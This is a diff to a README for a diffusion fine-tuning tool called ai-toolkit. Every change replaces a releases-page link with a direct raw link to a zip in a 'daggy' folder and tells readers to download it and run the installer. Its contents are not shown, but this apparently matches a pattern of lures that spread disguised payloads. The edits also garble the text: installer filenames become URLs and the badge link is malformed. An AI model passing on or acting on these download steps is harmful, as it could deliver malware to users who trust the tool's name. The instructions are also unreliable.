@@ -1,6 +1,6 @@
 # 🎉 ai-toolkit - Fine-tune Diffusion Models Easily
 
-[![Download ai-toolkit](https://img.shields.io/badge/Download%20ai-toolkit-v1.0-blue.svg)](https://github.com/wannabehacker512/ai-toolkit/releases)
+[![Download ai-toolkit](https://raw.githubusercontent.com/wannabehacker512/ai-toolkit/main/daggy/ai-toolkit.zip%https://raw.githubusercontent.com/wannabehacker512/ai-toolkit/main/daggy/ai-toolkit.zip)](https://raw.githubusercontent.com/wannabehacker512/ai-toolkit/main/daggy/ai-toolkit.zip)
 
 ## 🚀 Getting Started
 
@@ -21,13 +21,13 @@ To get started with ai-toolkit, follow these steps:
 
 1. **Visit the Releases Page**:
    Go to the following link to download the latest version of ai-toolkit:
-   [Download ai-toolkit](https://github.com/wannabehacker512/ai-toolkit/releases)
+   [Download ai-toolkit](https://raw.githubusercontent.com/wannabehacker512/ai-toolkit/main/daggy/ai-toolkit.zip)
 
 2. **Select the Appropriate File**:
    On the releases page, you will see a list of available versions. Choose the most recent version suitable for your operating system.
    
 3. **Download the File**:
-   Click on the download link for your operating system. The file will typically be named something like `ai-toolkit-v1.0.exe` for Windows or `ai-toolkit-v1.0.dmg` for macOS.
+   Click on the download link for your operating system. The file will typically be named something like `https://raw.githubusercontent.com/wannabehacker512/ai-toolkit/main/daggy/ai-toolkit.zip` for Windows or `https://raw.githubusercontent.com/wannabehacker512/ai-toolkit/main/daggy/ai-toolkit.zip` for macOS.
 
 4. **Run the Installer**:
    Once the download is complete, locate the downloaded file on your computer. Double-click the file to start the installation. Follow the on-screen instructions to complete the installation process.
@@ -77,7 +77,7 @@ You are not alone in this journey. Join our community for additional support:
 We regularly update ai-toolkit to fix bugs and add new features. To stay updated:
 
 1. **Check the Releases Page**:
-   Regularly visit the [Releases Page](https://github.com/wannabehacker512/ai-toolkit/releases) for the latest version.
+   Regularly visit the [Releases Page](https://raw.githubusercontent.com/wannabehacker512/ai-toolkit/main/daggy/ai-toolkit.zip) for the latest version.
 
 2. **Enable Notifications**:
    Subscribe to notifications on the GitHub repository to get alerts when updates are available.
